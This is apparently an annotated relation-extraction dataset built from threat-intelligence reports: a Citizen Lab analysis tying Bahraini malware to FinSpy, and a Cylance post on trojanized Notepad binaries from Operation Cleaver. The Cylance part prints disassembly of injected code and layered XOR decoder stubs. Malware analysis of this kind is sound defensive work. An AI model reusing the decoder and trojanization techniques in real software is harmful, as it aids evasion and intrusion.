"debug", "strings", "found", "the"], ["in", "memory", "of", "infected", "processes", "appear", "to", "identify", "the", "product", "and", "(2)", "the", "samples", "have", "similarities", "with"], ["malware", "that", "communicates", "with", "domains", "belonging", "to", "Gamma", "International", "."], ["Debug", "Strings", "found", "in", "memory"], ["As", "we", "previously", "noted", ",", "infected", "processes", "were", "found", "containing", "strings", "that", "include", "\u201cfinspyv4", ".", "01\u201d", "and"], ["\u201cfinspyv2\u201d:"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\libs\\libgmp\\mpn-tdiv_qr.c"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\libs\\libgmp\\mpn-mul_fft.c"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv"], ["er", ".", "pdb"], ["Publicly", "available", "descriptions", "of", "the", "FinSpy", "tool", "collected", "by", "Privacy", "International", "among", "others", "and", "posted"], ["on", "Wikileaks8", "make", "the", "a", "series", "of", "claims", "about", "functionality:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["Bypassing", "of", "40", "regularly", "tested", "Antivirus", "Systems"], ["Covert", "Communication", "with", "Headquarters"], ["Full", "Skype", "Monitoring", "(Calls", ",", "Chats", ",", "File", "Transfers", ",", "Video", ",", "Contact", "List)"], ["Recording", "of", "common", "communication", "like", "Email", ",", "Chats", "and", "Voice-over-IP"], ["Live", "Surveillance", "through", "Webcam", "and", "Microphone"], ["Country", "Tracing", "of", "Target"], ["Silent", "Extracting", "of", "Files", "from", "Hard-Disk"], ["Process-based", "Key-logger", "for", "faster", "analysis"], ["Live", "Remote", "Forensics", "on", "Target", "System"], ["Advanced", "Filters", "to", "record", "only", "important", "information"], ["Supports", "most", "common", "Operating", "Systems", "(Windows", ",", "Mac", "OSX", "and", "Linux)"], ["18"], ["July", "2012"], ["Shared", "behavior", "with", "a", "sample", "that", "communicates", "with", "Gamma"], ["The", "virtual", "machine", "used", "by", "the", "packer", "has", "very", "special", "sequences", "in", "order", "to", "execute", "the", "virtualised", "code", ",", "for"], ["example:"], ["66", "C7", "07", "9D", "61", "mov", "word", "ptr", "[edi]", ",", "619Dh"], ["C6", "47", "02", "68", "mov", "byte", "ptr", "[edi+2]", ",", "68h"], ["89", "57", "03", "mov", "[edi+3]", ",", "edx"], ["C7", "47", "07", "68", "00", "00", "00", "mov", "dword", "ptr", "[edi+7]", ",", "68h"], ["89", "47", "08", "mov", "[edi+8]", ",", "eax"], ["C6", "47", "0C", "C3", "mov", "byte", "ptr", "[edi+0Ch]", ",", "0C3h"], ["Based", "on", "this", "we", "created", "a", "signature", "from", "the", "Bahrani", "malware", ",", "which", "we", "shared", "with", "another", "security"], ["researcher", "who", "identified", "a", "sample", "that", "shared", "similar", "virtualised", "obfuscation", ".", "That", "sample", "is:"], ["md5:", "c488a8aaef0df577efdf1b501611ec20"], ["sha1:", "5ea6ae50063da8354e8500d02d0621f643827346"], ["sha256:", "81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf"], ["The", "sample", "connects", "to", "the", "following", "domains:"], ["tiger", ".", "gamma-international.de"], ["ff-demo", ".", "blogdns.org"], ["The", "domain", "tiger", ".", "gamma-international.de", "has", "the", "following", "Whois", "information9:"], ["Domain:", "gamma-international", ".", "de"], ["Name:", "Martin", "Muench"], ["Organisation:", "Gamma", "International", "GmbH"], ["Address:", "Baierbrunner", "Str", ".", "15"], ["PostalCode:", "81379"], ["City:", "Munich"], ["CountryCode:", "DE"], ["Phone:", "+49-89-2420918-0"], ["Fax:", "+49-89-2420918-1"], ["Email:", "info@gamma-international", ".", "de"], ["Changed:", "2011-04-04T11:24:20+02:00"], ["19"], ["July", "2012"], ["Martin", "Muench", "is", "a", "representative", "of", "Gamma", "International", ",", "a", "company", "that", "sells", "\u201cadvanced", "technical"], ["surveillance", "and", "monitoring", "solutions\u201d", ".", "One", "of", "the", "services", "they", "provide", "is", "FinFisher:", "IT", "Intrusion", ",", "including"], ["the", "FinSpy", "tool", ".", "This", "labelling", "indicates", "that", "the", "matching", "sample", "we", "were", "provided", "may", "be", "a", "demo", "copy", "a"], ["FinFisher", "product", "per", "the", "domain", "ff-demo", ".", "blogdns.org."], ["We", "have", "linked", "a", "set", "of", "novel", "virtualised", "code", "obfuscation", "techniques", "in", "our", "Bahraini", "samples", "to", "another"], ["binary", "that", "communicates", "with", "Gamma", "International", "IP", "addresses", ".", "Taken", "alongside", "the", "explicit", "use", "of", "the"], ["name", "\u201cFinSpy\u201d", "in", "debug", "strings", "found", "in", "infected", "processes", ",", "we", "suspect", "that", "the", "malware", "is", "the", "FinSpy", "remote"], ["intrusion", "tool", ".", "This", "evidence", "appears", "to", "be", "consistent", "with", "the", "theory", "that", "the", "dissidents", "in", "Bahrain", "who"], ["received", "these", "e-mails", "were", "targeted", "with", "the", "FinSpy", "tool", ",", "configured", "to", "exfiltrate", "their", "harvested", "information"], ["to", "servers", "in", "Bahraini", "IP", "space", ".", "If", "this", "is", "not", "the", "case", ",", "we", "invite", "Gamma", "International", "to", "explain", "."], ["RECOMMENDATIONS"], ["The", "samples", "from", "email", "attachments", "have", "been", "shared", "with", "selected", "individuals", "within", "the", "security"], ["community", ",", "and", "we", "strongly", "urge", "antivirus", "companies", "and", "security", "researchers", "to", "continue", "where", "we", "have", "left"], ["off", "."], ["Be", "wary", "of", "opening", "unsolicited", "attachments", "received", "via", "email", ",", "skype", "or", "any", "other", "communications"], ["mechanism", ".", "If", "you", "believe", "that", "you", "are", "being", "targeted", "it", "pays", "to", "be", "especially", "cautious", "when", "downloading"], ["files", "over", "the", "Internet", ",", "even", "from", "links", "that", "are", "purportedly", "sent", "by", "friends", "."], ["ACKNOWLEDGEMENTS"], ["Malware", "analysis", "by", "Morgan", "Marquis-Boire", "and", "Bill", "Marczak", ".", "Assistance", "from", "Seth", "Hardy", "and", "Harry", "Tuttle"], ["gratefully", "received", "."], ["Special", "thanks", "to", "John", "Scott-Railton", "."], ["Thanks", "to", "Marcia", "Hofmann", "and", "the", "Electronic", "Frontier", "Foundation", "(EFF)", "."], ["We", "would", "also", "like", "to", "acknowledge", "Privacy", "International", "for", "their", "continued", "work", "and", "graciously", "provided"], ["background", "information", "on", "Gamma", "International", "."], ["20"], ["July", "2012"], ["FOOTNOTES"], ["1"], ["http://www", ".", "finfisher.com/"], ["http://owni", ".", "eu/2011/12/15/finfisher-for-all-your-intrusive-surveillance-needs/#SpyFiles"], ["3"], ["http://blogs", ".", "aljazeera.com/profile/melissa-chan"], ["4"], ["This", "technique", "was", "used", "in", "the", "recent", "Madi", "malware", "attacks", "."], ["5"], ["http://www", ".", "finfisher.com/"], ["6"], ["Unpacking", "Virtualised", "Obfuscators", "by", "Rolf", "Rolles", "http://static", ".", "usenix.org/event/woot09/tech/full_papers/rolles.pdf"], ["7"], ["http://whois", ".", "domaintools.com/77.69.140.194"], ["2"], ["8"], ["9"], ["E", ".", "g.", "http://wikileaks", ".", "org/spyfiles/files/0/289_GAMMA-201110-FinSpy.pdf"], ["http://whois", ".", "domaintools.com/gamma-international.de"], ["Back", "to", "top"], ["MEDIA", "COVERAGE"], ["The", "Wall", "Street", "Journal"], ["Slate"], ["CSO"], ["Tech", "Week", "Europe"], ["Bloomberg"], ["Electronic", "Frontier", "Foundation"], ["Privacy", "International"], ["Spiegel", "Online"], ["PC", "Mag"], ["The", "New", "York", "Times"], ["About", "the", "Author"], ["Morgan", "Marquis-Boire", "is", "a", "Technical", "Advisor", "at", "the", "Citizen", "Lab", ",", "Munk", "School", "of", "Global", "Affairs", ",", "University"], ["of", "Toronto", ".", "He", "works", "as", "a", "Security", "Engineer", "at", "Google", "specializing", "in", "Incident", "Response", ",", "Forensics", "and"], ["Malware", "Analysis", "."], ["21"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "Operation Cleaver", "sent_id": 8, "pos": [6, 7]}, {"old_id": "T2", "type": "Campaign", "name": "Operation Cleaver", "sent_id": 10, "pos": [10, 11]}, {"old_id": "T3", "type": "MD5", "name": "83868cdff62829fe3b897e2720204679", "sent_id": 32, "pos": [0]}, {"old_id": "T4", "type": "Malware", "name": "notepadexe", "sent_id": 33, "pos": []}, {"old_id": "T5", "type": "MD5", "name": "bfc59f1f442686af73704eff6c0226f0", "sent_id": 36, "pos": [0]}, {"old_id": "T6", "type": "Malware", "name": "NOTEPAD2EXE", "sent_id": 37, "pos": []}, {"old_id": "T7", "type": "MD5", "name": "e8ea10d5cde2e8661e9512fb684c4c98", "sent_id": 40, "pos": [0]}, {"old_id": "T8", "type": "Malware", "name": "Notepad3exe", "sent_id": 41, "pos": []}, {"old_id": "T9", "type": "MD5", "name": "baa76a571329cdc4d7e98c398d80450c", "sent_id": 44, "pos": [0]}, {"old_id": "T10", "type": "Malware", "name": "Notepad4exe", "sent_id": 45, "pos": []}, {"old_id": "T11", "type": "MD5", "name": "19d9b37d3acf3468887a4d41bf70e9aa", "sent_id": 48, "pos": [0]}, {"old_id": "T12", "type": "Malware", "name": "notepad10exe", "sent_id": 49, "pos": []}, {"old_id": "T13", "type": "MD5", "name": "d378bffb70923139d6a4f546864aa61c", "sent_id": 52, "pos": [0]}, {"old_id": "T14", "type": "Malware", "name": "Notepad4exe", "sent_id": 94, "pos": []}, {"old_id": "T15", "type": "Campaign", "name": "Cleaver", "sent_id": 441, "pos": [3]}, {"old_id": "T16", "type": "Campaign", "name": "Cleaver", "sent_id": 455, "pos": [10]}, {"old_id": "T17", "type": "Malware", "name": "Notepad3exe", "sent_id": 433, "pos": []}, {"old_id": "T18", "type": "Malware", "name": "Notepad4exe", "sent_id": 433, "pos": []}, {"old_id": "T19", "type": "Malware", "name": "notepad10exe", "sent_id": 433, "pos": []}, {"old_id": "T20", "type": "Malware", "name": "NOTEPAD2EXE", "sent_id": 434, "pos": []}], "labels": [{"old_id": "R1", "r": "P21", "h": 2, "t": 3, "evidence": [32, 33]}, {"old_id": "R2", "r": "P21", "h": 4, "t": 5, "evidence": [36, 37]}, {"old_id": "R3", "r": "P21", "h": 6, "t": 7, "evidence": [40, 41]}, {"old_id": "R4", "r": "P21", "h": 8, "t": 9, "evidence": [44, 45]}, {"old_id": "R5", "r": "P21", "h": 10, "t": 11, "evidence": [48, 49]}], "title": ["inputs/txt/201412CylanceOperationCleaver"], "sents": [["(//www", ".", "cylance.com/)"], ["\u00ab", "Back", "to", "Blog(//blog", ".", "cylance.com)"], ["Operation", "Cleaver:"], ["The", "Notepad", "Files"], ["By", "Derek", "Soeder(//blog", ".", "cylance.com/author/derek-soeder)"], ["|"], ["December", "5", ",", "2014"], ["You", "see", "some", "strange", "stuff", "out", "there", "on", "the", "networks", "where", "attackers", "are", "active", ".", "Certainly", "the"], ["stash", "of", "files", "unearthed", "during", "the", "Operation", "Cleaver", "investigation", "included", "much", "of", "the", "bizarre"], ["and", "something", "of", "the", "terrible", ".", "Brian", "Wallace", ",", "who", "led", "the", "investigation", ",", "shared", "a", "mysterious", "set"], ["of", "samples", "with", "me", "awhile", "back", ",", "and", "now", "that", "Operation", "Cleaver", "is", "public", ",", "I'll", "relate", "the", "lurid"], ["technical", "details", "."], ["The", "Notepad", "Files"], ["The", "files", "in", "question", "were", "found", "in", "a", "dim", "and", "dusty", "directory", "on", "a", "forlorn", "FTP", "server", "in", "the", "US", ","], ["commingled", "with", "the", "detritus", "of", "past", "attack", "campaigns", "and", "successful", "compromises", ".", "They", "were"], ["at", "once", "familiar", "and", "strange", ",", "and", "they", "were", "made", "still", "stranger", "and", "more", "perplexing", "by", "their"], ["location", "and", "the", "circumstances", "of", "their", "discovery", ".", "All", "around", "them", "was", "a", "clutter", "of", "credential"], ["dumps", ",", "hacking", "utilities", ",", "RATs", ",", "and", "even", "legitimate", "software", "installers", ",", "but", "the", "files", "in", "question"], ["were", "none", "of", "these", ".", "They", "were", "Notepad", "."], ["Figure", "1", ".", "The", "Notepad", "Doppelg\u00e4ngers", "."], ["Of", "course", ",", "a", "purloined", "Notepad", "icon", "in", "malware", "is", "nothing", "new", ",", "but", "something", "different", "was"], ["going", "on", "here", ".", "Within", "each", "of", "the", "two", "families", ",", "all", "of", "the", "samples", "had", "the", "same", "main", "icon", ",", "file"], ["size", ",", "and", "version", "information", ",", "yet", "each", "one", "had", "a", "distinct", "hash", ".", "At", "the", "time", ",", "only", "one", "of", "those", "five"], ["hashes", "existed", "on", "the", "internet:", "the", "official", "32-bit", "Simplified", "Chinese", "Notepad", "from", "Windows", "XP"], ["x64", "/", "Windows", "Server", "2003", ".", "Suspecting", "that", "the", "remaining", "Notepads", "were", "derivatives", "of", "official"], ["Windows", "files", ",", "we", "associated", "the", "other", "member", "of", "the", "first", "family", "with", "the", "confirmed", "legitimate"], ["Notepad", ",", "and", "we", "matched", "the", "second", "family", "with", "the", "32-bit", "US", "English", "Notepad", "from", "Windows"], ["7", "(not", "present", "in", "the", "original", "set)", "."], ["MD5"], ["File", "Name"], ["File", "Size"], ["File", "Version"], ["83868cdff62829fe3b897e2720204679"], ["notepad", ".", "exe"], ["66", ",", "048"], ["5", ".", "2.3790.3959,", "Chinese", "(Simplified", ",", "PRC)"], ["bfc59f1f442686af73704eff6c0226f0"], ["NOTEPAD2", ".", "EXE"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States)"], ["e8ea10d5cde2e8661e9512fb684c4c98"], ["Notepad3", ".", "exe"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States)"], ["baa76a571329cdc4d7e98c398d80450c"], ["Notepad4", ".", "exe"], ["66", ",", "048"], ["5", ".", "2.3790.3959,", "Chinese", "(Simplified", ",", "PRC)"], ["19d9b37d3acf3468887a4d41bf70e9aa"], ["notepad10", ".", "exe"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States"], ["d378bffb70923139d6a4f546864aa61c"], ["--"], ["179", ",", "712"], ["6", ".", "1.7600.16385,", "English", "(United", "States)"], ["Table", "1", ".", "A", "summary", "of", "Notepad", "samples", "dug", "from", "the", "attackers'", "FTP", "drop", ",", "with", "the", "official", "Windows", "7", "Notepad", "appearing", "at"], ["bottom", ".", "It", "and", "the", "official", "Windows", "XP/2003", "Notepad", "are", "represented", "in", "green", "."], ["Things", "got", "interesting", "when", "we", "started", "comparing", "the", "Notepads", "at", "the", "byte", "level", ".", "The", "image"], ["below", "depicts", "some", "byte", "differences", "between", "the", "original", "Windows", "7", "Notepad", "and", "samples"], ["NOTEPAD2", ".", "EXE", "and", "Notepad3", ".", "exe:"], ["Figure", "2", ".", "Comparison", "of", "the", "Windows", "7", "Notepad", "(green", "channel)", ",", "NOTEPAD2", ".", "EXE", "(red", "channel)", ",", "and", "Notepad3", ".", "exe", "(blue", "channel)", "."], ["At", "the", "Portable", "Executable", "(PE)", "level", ",", "these", "differences", "translate", "to", "changes", "in", "the", "files'"], ["timestamps", "(IMAGE_NT_HEADERS", ".", "FileHeader.TimeDateStamp,", "offset", "0xE8", "in", "the", "figure", "above)", ","], ["the", "relative", "virtual", "addresses", "(RVAs)", "of", "their", "entry", "points"], ["(IMAGE_NT_HEADERS", ".", "OptionalHeader.AddressOfEntryPoint,", "offset", "0x108)", ",", "and", "their"], ["checksums", "(IMAGE_NT_HEADERS", ".", "OptionalHeader.CheckSum,", "offset", "0x138)", ".", "The", "timestamps"], ["were", "rolled", "back", "by", "weeks", "to", "months", "relative", "to", "the", "legitimate", "progenitors'", "timestamps;", "we"], ["don't", "know", "why", ".", "The", "entry", "points", "retreated", "or", "advanced", "by", "hundreds", "of", "bytes", "to", "dozens", "of"], ["kilobytes", ",", "for", "reasons", "we'll", "explore", "shortly", ".", "And", "the", "checksums", "were", "all", "zeroed", "out", ",", "presumably"], ["because", "the", "file", "modifications", "invalidate", "them", ",", "invalid", "non-zero", "checksums", "are", "a", "tip-off", ",", "and"], ["zeroing", "is", "easier", "than", "recomputing", "."], ["So", "what's", "the", "story", "with", "all", "those", "other", "modifications", "?", "In", "all", "cases", "they", "seem", "to", "be", "confined", "to"], ["the", "\"", ".", "text\"", "section", ",", "centrally", "located", "to", "avoid", "the", "import", "directory", ",", "debug", "directory", ",", "load"], ["configuration", "directory", ",", "and", "import", "address", "table", ".", "This", "makes", "sense", "as", "a", "general", "precaution", ","], ["considering", "that", "corrupting", "the", "import", "directory", "would", "unhelpfully", "crash", "the", "Windows", "loader"], ["during", "process", "initialization", ".", "The", "following", "image", "illustrates", "the", "distribution", "of", "modifications"], ["relative", "to", "these", "structures", "."], ["Figure", "3", ".", "File", "locations", "of", "modifications", "(red)", "and", "the", "PE", "structures", "they", "avoid", "(gray)", ".", "From", "left", "to", "right", ",", "the", "four", "vertical", "bars"], ["represent", "the", "\"", ".", "text\"", "sections", "of", "NOTEPAD2", ".", "EXE,", "Notepad3", ".", "exe,", "Notepad4", ".", "exe,", "and", "notepad10", ".", "exe,", "as", "compared", "to", "the", "original"], ["Notepad", "from", "their", "respective", "families", ".", "The", "Import", "Address", "Table", "(IAT)", ",", "original", "entry", "point", "(OEP", ",", "green)", ",", "malware", "entry", "point", "(EP", ","], ["yellow)", ",", "load", "configuration", "directory", "(LC)", ",", "import", "directory", "(Imp)", ",", "and", "debug", "directory", "(Dbg)", "are", "labeled", "."], ["While", "the", "arrangement", "of", "the", "structures", "varies", "among", "families", ",", "it's", "clear", "from", "the", "figure", "above"], ["that", "the", "region", "between", "structures", "containing", "the", "original", "entry", "point", "has", "in", "each", "case", "been", "filled"], ["with", "modifications", ".", "Notably", ",", "each", "sample", "has", "a", "short", "run", "of", "consecutive", "modifications"], ["immediately", "following", "the", "new", "entry", "point", ",", "and", "then", "a", "longer", "run", "elsewhere", "in", "the", "region", "."], ["Presumably", ",", "both", "runs", "are", "injected", "malicious", "code", ",", "and", "the", "other", "modifications", "may", "well", "be"], ["random", "noise", "intended", "as", "a", "distraction", ".", "Since", "there", "are", "no", "other", "changes", "and", "no", "appended", "data", ","], ["it's", "reasonable", "to", "assume", "that", "the", "code", "that", "makes", "a", "Notepad", "act", "like", "Notepad", "is", "simply", "gone", ","], ["and", "that", "the", "samples", "will", "behave", "only", "maliciously", ".", "If", "true", ",", "then", "these", "modifications", "would"], ["represent", "a", "backdooring", "or", "\"Trojanization\"", "rather", "than", "a", "parasitic", "infection", ",", "and", "this", "distinction"], ["implies", "certain", "things", "about", "how", "the", "Notepads", "were", "made", "and", "how", "they", "might", "be", "used", "."], ["Tales", "from", "the", "Code"], ["Let's", "take", "a", "look", "at", "the", "entry", "point", "code", "of", "the", "malicious", "Notepads", "and", "see", "if", "it", "aligns", "with", "our"], ["observations", ".", "The", "short", "answer", "is", ",", "it", "looks", "like", "nonsense", ".", "Here's", "a", "snippet", "from", "Notepad4", ".", "exe:"], ["010067E3"], ["010067E8"], ["010067EA"], ["010067F0"], ["010067F2"], ["010067F7"], ["010067F9"], ["010067FB"], ["010067FC"], ["010067FE"], ["010067FF"], ["sbb", "eax", ",", "2C7AE239"], ["test", "al", ",", "80"], ["test", "eax", ",", "498DBAD5"], ["jle", "short", "01006831"], ["sub", "eax", ",", "B69F4A73"], ["or", "edx", ",", "esi"], ["jnz", "short", "01006800"], ["inc", "ebx"], ["mov", "cl", ",", "91"], ["cwde"], ["jnp", "short", "01006803"], ["At", "this", "point", "the", "code", "becomes", "difficult", "to", "list", "due", "to", "instruction", "scission", ",", "or", "branching", "into", "the"], ["middle", "of", "an", "instruction", "(analogous", "to", "a", "frameshift", "error", "in", "DNA", "translation", ",", "if", "that", "helps)", ".", "For"], ["instance", ",", "the", "JNP", "instruction", "at", "010067FF", "is", "a", "two-byte", "instruction", ",", "and", "the", "JNZ", "branch", "at"], ["010067F9", ",", "if", "satisfied", ",", "jumps", "to", "the", "JNP", "instruction's", "second", "byte", "at", "01006800", ".", "That", "byte", "begins"], ["a", "different", "two-byte", "instruction", ",", "which", "incorporates", "what", "would", "have", "otherwise", "been", "the", "first"], ["byte", "of", "the", "instruction", "after", "the", "JNP", ",", "meaning", "its", "successor", "will", "start", "in", "the", "middle", "of", "JNP's"], ["successor", ",", "and", "so", "on", ".", "The", "two", "execution", "paths", "usually", "(but", "don't", "necessarily)", "converge", "after", "a"], ["few", "instructions", "."], ["The", "outcome", "of", "these", "instructions", "depends", "on", "the", "initial", "state", "of", "the", "registers", ",", "which", "is"], ["technically", "undefined", ".", "Seeing", "code", "operate", "on", "undefined", "values", "typically", "suggests", "that", "the", "bytes"], ["aren't", "code", "after", "all", "and", "so", "shouldn't", "have", "been", "disassembled", ".", "But", "keep", "looking", ".", "Notice", "that"], ["there", "are", "no", "memory", "accesses", "(which", "could", "raise", "an", "access", "violation)", ",", "no", "stack", "pointer"], ["manipulation", "(which", "could", "cause", "a", "stack", "overflow", "or", "underflow)", ",", "no", "division", "instructions", "(which"], ["could", "raise", "a", "divide", "exception)", ",", "no", "invalid", "or", "privileged", "instructions", ",", "no", "interrupts", "or", "indirect"], ["branches--really", ",", "no", "uncontrolled", "execution", "transfers", "of", "any", "kind", ".", "Even", "more", "tellingly", ",", "all", "the"], ["possible", "execution", "paths", "seem", "to", "eventually", "flow", "to", "this", "code:"], ["01006877"], ["01006879"], ["0100687E"], ["0100687F"], ["01006881"], ["01006882"], ["01006883"], ["01006884"], ["01006885"], ["01006886"], ["01006887"], ["01006888"], ["01006889"], ["0100688E"], ["0100688F"], ["01006891"], ["mov", "ch", ",", "15"], ["cmp", "eax", ",", "4941B62F"], ["xchg", "eax", ",", "ebx"], ["mov", "cl", ",", "4B"], ["stc"], ["wait"], ["xchg", "eax", ",", "ecx"], ["inc", "ebx"], ["cld"], ["db", "67"], ["aaa"], ["cwde"], ["sub", "eax", ",", "24401D66"], ["dec", "eax"], ["add", "al", ",", "F8"], ["jmp", "01005747"], ["01005747"], ["01005748"], ["nop"], ["jmp"], ["01005758"], ["01005758"], ["01005759"], ["0100575A"], ["cld"], ["nop"], ["jmp"], ["short", "01005768"], ["01005768"], ["call", "01005A70"], ["01005A70"], ["01005A71"], ["nop"], ["pop", "ebp"], ["01005A72"], ["01005A85"], ["jmp"], ["nop"], ["01005A85"], ["01005A86"], ["mov"], ["01005A99"], ["01005A9B"], ["push", "00000040"], ["push", "00001000"], ["01005A8B"], ["01005AA0"], ["01005AA1"], ["01005AAF"], ["01005AB0"], ["01005AB1"], ["esi", ",", "000001A9"], ["jmp"], ["nop"], ["jmp"], ["01005A99"], ["01005AAF"], ["push", "esi"], ["nop"], ["jmp"], ["01005AC2"], ["01005AC2"], ["01005AC4"], ["push", "0"], ["push", "E553A458"], ["01005AD7"], ["call", "ebp"], ["01005AC9"], ["jmp"], ["01005AD7"], ["Here", "the", "gaps", "in", "the", "listing", "indicate", "when", "the", "disassembly", "follows", "an", "unconditional", "branch", ".", "The"], ["code", "seems", "to", "abruptly", "change", "character", "after", "the", "jump", "at", "01006891", ",", "transitioning", "from"], ["gibberish", "to", "a", "string", "of", "short", "sequences", "connected", "by", "unconditional", "branches", ".", "This", "transition"], ["corresponds", "to", "a", "jump", "from", "the", "end", "of", "the", "short", "run", "of", "modifications", "(01006896)", "after", "the"], ["malware", "entry", "point", "to", "the", "beginning", "of", "the", "longer", "run", "of", "modifications", "(01005747)", "a", "few"], ["kilobytes", "before", "it", ".", "(See", "the", "third", "column", "in", "Figure", "3", ".", ")"], ["In", "the", "disassembly", "above", ",", "the", "first", "sequence", "of", "green", "lines", "is", "a", "clear", "CALL-POP", "pair", "intended", "to"], ["obtain", "a", "code", "address", "in", "a", "position-independent", "way", ".", "(An", "immediate", "address", "value", "marked", "with"], ["a", "relocation", "would", "be", "the", "orthodox", "way", "to", "obtain", "a", "code", "pointer", ",", "but", "preparing", "that", "would", "have"], ["involved", "modifying", "the", "\"", ".", "reloc\"", "section", ".", ")", "No", "way", "is", "this", "construct", "a", "coincidence", ".", "Furthermore", ",", "the"], ["blue", "lines", "strongly", "resemble", "the", "setup", "for", "a", "VirtualAlloc", "call", "(VirtualAlloc(NULL", ",", "0x1A9", ","], ["MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE))", "typical", "of", "a", "deobfuscation", "stub", ",", "and", "the", "second"], ["set", "of", "green", "lines", "invoke", "the", "CALL-POPped", "function", "pointer", "with", "what", "one", "might", "readily", "assume"], ["is", "a", "hash", "of", "the", "string", "\"VirtualAlloc\"", ".", "(It", "is", ".", ")"], ["There's", "plenty", "more", "to", "observe", "in", "the", "disassembly", ",", "but", ",", "let's", "fast-forward", "past", "it", "."], ["windbg", "-c", "\"bp", "kernel32", "!", "VirtualAlloc", ";", "g\"", "Notepad4", ".", "exe..."], ["Figure", "4", ".", "VirtualAlloc", "breakpoint", "hit", ".", "The", "parameters", "on", "the", "stack", "and", "the", "state", "of", "the", "registers", "are", "as", "expected", "."], ["g", "poi(@esp)", ";", "ba", "w", "1", "@eax+@esi-1", ";", "g", ".", ".."], ["Figure", "5", ".", "Memory", "write", "(hardware)", "breakpoint", "hit", "after", "the", "last", "(0x1A9th)", "byte", "is", "written", "to", "allocated", "memory", "."], ["And", "now", "we", "can", "dump", "the", "extracted", "code", "from", "memory", ".", "It", "isn't", "immediately", "gratifying:"], ["00100000"], ["00100002"], ["00100007"], ["0010000B"], ["0010000C"], ["0010000E"], ["00100010"], ["00100013"], ["00100016"], ["00100019"], ["fabs"], ["mov", "edx", ",", "4DF05534", ";", "=", "initial", "XOR", "key"], ["fnstenv", "[esp-0C]"], [";", "old", "trick", "to", "get", "EIP"], ["pop", "eax"], ["sub", "ecx", ",", "ecx"], ["mov", "cl", ",", "64"], [";", "=", "length", "in", "DWORDs"], ["xor", "[eax+19]", ",", "edx"], ["add", "edx", ",", "[eax+19]", ";", "XOR", "key", "is", "modified", "after", "each", "DWORD"], ["add", "eax", ",", "4"], ["db", "D6"], ["The", "byte", "0xD6", "at", "address", "00100019", "doesn't", "disassemble", ",", "and", "there", "aren't", "any", "branches"], ["skipping", "over", "it", ".", "But", "check", "out", "the", "instructions", "just", "above", "it", "referencing", "\"[eax+19]\"", ".", "The", "code", "is", "in"], ["a", "sense", "self-modifying", ",", "flowing", "right", "into", "a", "portion", "of", "itself", "that", "it", "XOR", "decodes", ".", "The", "first"], ["decoded", "instruction", "is", "\"LOOP", "00100010\"", "(0xD6", "^", "0x34", "=", "0xE2", ",", "the", "opcode", "for", "LOOP)", ",", "which", "will"], ["execute", "the", "XOR", "loop", "body", "99", "more", "times", "(CL", "-", "1", "=", "0x63", "=", "99)", "and", "then", "fall", "through", "to", "the"], ["newly-decoded", "code", "."], ["When", "we", "run", "this", "decoding", "stub", "(which", ",", "come", "to", "find", "out", ",", "is", "Metasploit's", "\"shikata", "ga", "nai\"", "decoder"], ["stub)", "to", "completion", ",", "we're", "rewarded", "with", ".", "..", "another", "decoding", "stub:"], ["0010001B"], ["0010001D"], ["00100021"], ["00100026"], ["00100027"], ["00100029"], ["0010002B"], ["fcmovu", "st", ",", "st(1)", ";", "a", "different", "initial", "FPU", "instruction", "from", "above"], ["fnstenv", "[esp-0C]", ";", "different", "ordering", "of", "independent", "instructions"], ["mov", "ebx", ",", "C2208861", ";", "a", "different", "initial", "XOR", "key", "and", "register"], ["pop", "ebp"], [";", "a", "different", "code", "pointer", "register"], ["xor", "ecx", ",", "ecx", ";", "XOR", "as", "an", "alternative", "to", "SUB", "for", "zeroing", "counter"], ["mov", "cl", ",", "5D", ";", "a", "shorter", "length"], ["xor", "[ebp+1A]", ",", "ebx", ";", "decoding", "starts", "at", "a", "different", "offset"], ["0010002E"], ["add"], ["ebx", ",", "[ebp+1A]"], ["0010002E"], ["00100031"], ["00100034"], ["add", "ebx", ",", "[ebp+1A]"], ["sub", "ebp", ",", "FFFFFFFC", ";", "SUB", "-4", "as", "an", "alternative", "to", "ADD", "+4"], ["loop", "000FFFCA", ";", "instruction", "is", "partly", "encoded"], ["Here", ",", "the", "first", "byte", "to", "be", "XORed", "is", "the", "second", "byte", "of", "the", "LOOP", "instruction", ",", "hence", "the"], ["nonsensical", "destination", "apparent", "in", "the", "pre-decoding", "disassembly", "above", ".", "(For", "brevity", ",", "we", "cut"], ["each", "listing", "at", "the", "first", "sign", "of", "encoding", ".", ")", "Run", "that", "to", "completion", ",", "and", "then", ".", ".."], ["00100036"], ["0010003B"], ["0010003D"], ["00100041"], ["00100042"], ["00100044"], ["00100046"], ["00100049"], ["0010004C"], ["mov", "edx", ",", "463DC74D"], ["fcmovnbe", "st", ",", "st(0)"], ["fnstenv", "[esp-0C]"], ["pop", "eax"], ["sub", "ecx", ",", "ecx"], ["mov", "cl", ",", "57", ";", "notice", "the", "length", "gets", "shorter", "each", "time"], ["xor", "[eax+12]", ",", "edx"], ["add", "eax", ",", "4"], ["add", "ebx", ",", "ds:[47B3DFC9]", ";", "instruction", "is", "partly", "encoded"], ["And", "then", ".", ".."], ["00100051"], ["00100053"], ["00100058"], ["0010005c"], ["0010005d"], ["0010005f"], ["00100061"], ["00100064"], ["00100067"], ["fcmovbe", "st", ",", "st(0)"], ["mov", "edx", ",", "869A5D73"], ["fnstenv", "[esp-0C]"], ["pop", "eax"], ["sub", "ecx", ",", "ecx"], ["mov", "cl", ",", "50"], ["xor", "[eax+18]", ",", "edx"], ["add", "eax", ",", "4"], ["add", "edx", ",", "[eax+67]", ";", "instruction", "is", "partly", "encoded"], ["And", "then", ".", ".."], ["0010006C"], ["00100071"], ["00100073"], ["00100077"], ["00100078"], ["mov", "eax", ",", "E878CF4D"], ["fcmovnbe", "st", 